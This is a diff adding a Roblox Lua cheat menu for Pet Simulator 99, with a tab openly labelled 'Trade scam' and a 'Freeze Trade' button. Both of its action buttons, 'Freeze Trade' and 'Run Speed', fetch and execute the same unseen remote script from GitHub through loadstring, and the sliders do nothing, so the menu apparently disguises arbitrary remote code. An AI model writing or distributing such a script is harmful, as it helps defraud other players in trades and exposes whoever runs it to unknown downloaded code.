@@ -1,0 +1,82 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "Pet Sim 99 Script",
+   Icon = 0, 
+   LoadingTitle = "Pet Sim 99 Script",
+   LoadingSubtitle = "by NoobScript",
+   Theme = "Default",
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false,
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil,
+      FileName = "NoobScript"
+   },
+   Discord = {
+      Enabled = true,
+      Invite = "XDYFFQ77Ha",
+      RememberJoins = true
+   },
+   KeySystem = true,
+   KeySettings = {
+      Title = "PS99 Script Key",
+      Subtitle = "Key System",
+      Note = "Key in Discord server",
+      FileName = "OhklJueh",
+      SaveKey = true,
+      GrabKeyFromSite = true,
+      Key = {"https://raw.githubusercontent.com/ivalina10/key/refs/heads/main/hub"}
+   }
+})
+
+local MainTab = Window:CreateTab("Trade scam", nil)
+local MainSection = MainTab:CreateSection("Main")
+
+Rayfield:Notify({
+   Title = "Loading Script",
+   Content = "Trade Scam Script",
+   Duration = 5,
+   Image = nil,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Freeze Trade",
+   Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/NoobScript0/Ps99-./refs/heads/main/script.lua'))()
+   end,
+})
+
+local Slider = MainTab:CreateSlider({
+   Name = "Freeze trade time",
+   Range = {0, 100},
+   Increment = 1,
+   Suffix = "Seconds",
+   CurrentValue = 25,
+   Flag = "Slider1",
+   Callback = function(Value)
+   end,
+})
+
+-- Nueva secciÃ³n: Hatch Speed
+local HatchTab = Window:CreateTab("Hatch Speed", nil)
+local HatchSection = HatchTab:CreateSection("Speed Settings")
+
+local HatchButton = HatchTab:CreateButton({
+   Name = "Run Speed",
+   Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/NoobScript0/Ps99-./refs/heads/main/script.lua'))()
+   end,
+})
+
+local SpeedSlider = HatchTab:CreateSlider({
+   Name = "Speed ",
+   Range = {1, 10},
+   Increment = 1,
+   Suffix = "x",
+   CurrentValue = 5,
+   Flag = "SpeedSlider",
+   Callback = function(Value)
+      print("Velocidad ajustada a: "..Value)
+end,
+})
